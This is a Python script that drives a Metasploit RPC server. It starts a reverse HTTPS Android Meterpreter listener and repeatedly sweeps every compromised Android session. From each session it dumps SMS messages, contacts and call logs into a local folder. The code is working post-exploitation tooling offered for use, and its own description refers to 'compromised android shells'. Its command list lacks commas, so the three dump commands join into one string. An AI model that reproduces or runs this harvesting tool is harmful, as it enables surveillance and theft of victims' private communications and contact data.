#!/usr/bin/env python3
import logging
from pathlib import Path
from time import sleep

from pymetasploit3.msfrpc import MsfRpcClient

logging.basicConfig(format='[%(asctime)s %(levelname)s]: %(message)s',
                    datefmt='%m/%d/%Y %I:%M:%S %p',
                    level='INFO')

### MSFRPC CLIENT PROPERTIES
DEFAULT_DUMP_PATH = '/home/retr0/Desktop/dump'
DEFAULT_MSF_RPC_SERVER_HOST = 'localhost'
DEFAULT_MSF_RPC_SERVER_PORT = 55553
DEFAULT_MSF_RPC_USE_SSL = False

### MULTI/HANDLER PROPERTIES
DEFAULT_MULTI_HANDLER_PAYLOAD = 'android/meterpreter/reverse_https'
DEFAULT_LHOST = '127.0.0.1'
DEFAULT_LPORT = 443

### ROUTINES
DEFAULT_SLEEP_TIMER_IN_SECONDS = 30
ANDROID_ROUTINE = \
    [
        f"dump_sms -o {DEFAULT_DUMP_PATH}/sms.txt"
        f"dump_contacts -o {DEFAULT_DUMP_PATH}/contacts.txt"
        f"dump_calllog -o {DEFAULT_DUMP_PATH}/calls.txt"
    ]


# https://metasploit.help.rapid7.com/docs/rpc-api
def get_arguments():
    from argparse import ArgumentParser

    parser = ArgumentParser(
        description='Use this script to connect to a remote Metasploit RPC server and perform a number of tasks on '
                    'the compromised android shells.')
    parser.add_argument('--msf-username',
                        dest='msf_username',
                        required=True,
                        help='A username to authenticate in Metasploit RPC')
    parser.add_argument('--msf-password',
                        dest='msf_password',
                        required=True,
                        help='A password to authenticate in Metasploit RPC')
    parser.add_argument('--msfrpc-host',
                        dest='msfrpc_host',
                        default=DEFAULT_MSF_RPC_SERVER_HOST,
                        required=False,
                        help='An IP address or a hostname of the Metasploit RPC server to connect to. '
                             'Default is ' + DEFAULT_MSF_RPC_SERVER_HOST)
    parser.add_argument('--msfrpc-ssl',
                        dest='msfrpc_ssl',
                        required=False,
                        help='A flag to enable the SSL during a connection to the Metasploit RPC server. '
                             'Default is ' + str(DEFAULT_MSF_RPC_USE_SSL))
    parser.add_argument('--msfrpc-port',
                        dest='msfrpc_port',
                        default=DEFAULT_MSF_RPC_SERVER_PORT,
                        required=False,
                        help='A tcp port of the Metasploit RPC server to connect to. '
                             'Default is ' + str(DEFAULT_MSF_RPC_SERVER_PORT))
    parser.add_argument('--multi-handler-host',
                        dest='lhost',
                        default=DEFAULT_LHOST,
                        required=False,
                        help='An IP address to use while listening for the incoming connections. '
                             'Default is ' + DEFAULT_LHOST)
    parser.add_argument('--multi-handler-port',
                        dest='lport',
                        default=DEFAULT_LPORT,
                        required=False,
                        help='A TCP port to use while listening for the incoming connections. '
                             'Default is ' + str(DEFAULT_LPORT))
    parser.add_argument('--multi-handler-payload',
                        dest='payload',
                        default=DEFAULT_MULTI_HANDLER_PAYLOAD,
                        required=False,
                        help='A payload to use with exploit/multi/handler. '
                             'Default is ' + DEFAULT_MULTI_HANDLER_PAYLOAD)
    parser.add_argument('--dump',
                        dest='dump',
                        default=DEFAULT_DUMP_PATH,
                        required=False,
                        help='An absolute path to a directory to store dump files. '
                             'Default is ' + DEFAULT_DUMP_PATH)
    parser.add_argument('--sleep',
                        dest='sleep',
                        default=DEFAULT_SLEEP_TIMER_IN_SECONDS,
                        required=False,
                        help='A sleep timer in seconds between dumps. '
                             'Default is ' + str(DEFAULT_SLEEP_TIMER_IN_SECONDS))
    options = parser.parse_args()

    return options


options = get_arguments()


class MetasploitClient:
    def __init__(self,
                 username,
                 password,
                 host=DEFAULT_MSF_RPC_SERVER_HOST,
                 port=DEFAULT_MSF_RPC_SERVER_PORT,
                 use_ssl=DEFAULT_MSF_RPC_USE_SSL,
                 dump_path=DEFAULT_DUMP_PATH,
                 sleep_timer=DEFAULT_SLEEP_TIMER_IN_SECONDS):
        try:
            logging.info(f'Connecting to {host}:{port}')
            self.client = MsfRpcClient(server=host,
                                       port=port,
                                       username=username,
                                       password=password,
                                       ssl=use_ssl)
            logging.info('Connected to remote Metasploit RPC')
            self.dump_path = dump_path
            self.sleep_timer_in_seconds = sleep_timer
        except Exception as e:
            logging.error(f'Connection error: {e}')
            exit(1)

    def start_multi_handler(self, payload_name, LHOST, LPORT):
        if 'multi/handler' in str(self.client.jobs.list):
            logging.warning('multi/handler is already started')
            return
        logging.info(f'Starting {payload_name} reverse handler on {LHOST}:{LPORT}')
        multi_handler = self.client.modules.use('exploit', 'multi/handler')
        payload = self.client.modules.use('payload', payload_name)
        payload['LHOST'] = LHOST
        payload['LPORT'] = LPORT
        multi_handler.execute(payload=payload)

    # return a list of active session ids
    def wait_for_connections(self):
        while True:
            if not self.client.sessions.list:
                logging.info(f'No active connections, sleeping for {self.sleep_timer_in_seconds} seconds and continue')
                sleep(self.sleep_timer_in_seconds)
            else:
                logging.info(f'{len(self.client.sessions.list)} meterpreter session(s) online')
                break

    def android_dump(self, session):
        for routine in ANDROID_ROUTINE:
            output = session.run_with_output(cmd=routine)
            if output:
                logging.info(f'{session.info["info"].replace(" ", "")}: {output.strip()}')

    def stop_jobs(self):
        if self.client.jobs.list:
            logging.info(f'Stopping all running jobs')
            for job in self.client.jobs.list:
                self.client.jobs.stop(job)


def main():
    client = None
    dump_path = options.dump
    Path(dump_path).mkdir(exist_ok=True)
    msfrpc_host = options.msfrpc_host
    msfrpc_port = int(options.msfrpc_port)
    use_ssl = options.msfrpc_ssl

    multi_handler_payload = options.payload
    multi_handler_LHOST = options.lhost
    multi_handler_LPORT = int(options.lport)

    sleep_timer_in_seconds = int(options.sleep)
    try:
        # STEP 1 - CONNECT TO THE REMOTE METASPLOIT
        client = MetasploitClient(host=msfrpc_host,
                                  port=msfrpc_port,
                                  use_ssl=use_ssl,
                                  username=options.msf_username,
                                  password=options.msf_password,
                                  dump_path=dump_path,
                                  sleep_timer=sleep_timer_in_seconds)

        # STEP 2 - START THE LISTENER
        client.start_multi_handler(payload_name=multi_handler_payload,
                                   LHOST=multi_handler_LHOST,
                                   LPORT=multi_handler_LPORT)

        # STEP 3 - DUMP EVERYTHING
        while True:
            client.wait_for_connections()
            active_sessions = [s for s in client.client.sessions.list]
            for session_id in active_sessions:
                session = client.client.sessions.session(session_id)
                info = session.info['info']
                platform = session.info['platform']
                if platform == 'android':
                    logging.info(f'{info}: starting android routine')
                    client.android_dump(session)
                    logging.info(f'{info.replace(" ", "")}: android routine has been completed, ')
            logging.info(f'{len(active_sessions)} sessions has been processed, '
                         f'sleeping for {sleep_timer_in_seconds} seconds and continue')
            sleep(sleep_timer_in_seconds)
    except KeyboardInterrupt:
        if client:
            logging.info('Killing all jobs before exit')
            client.stop_jobs()
    except Exception as e:
        logging.error(f'Unexpected error: {e}')
        if client:
            logging.info('Killing all jobs before exit')
            client.stop_jobs()


main()
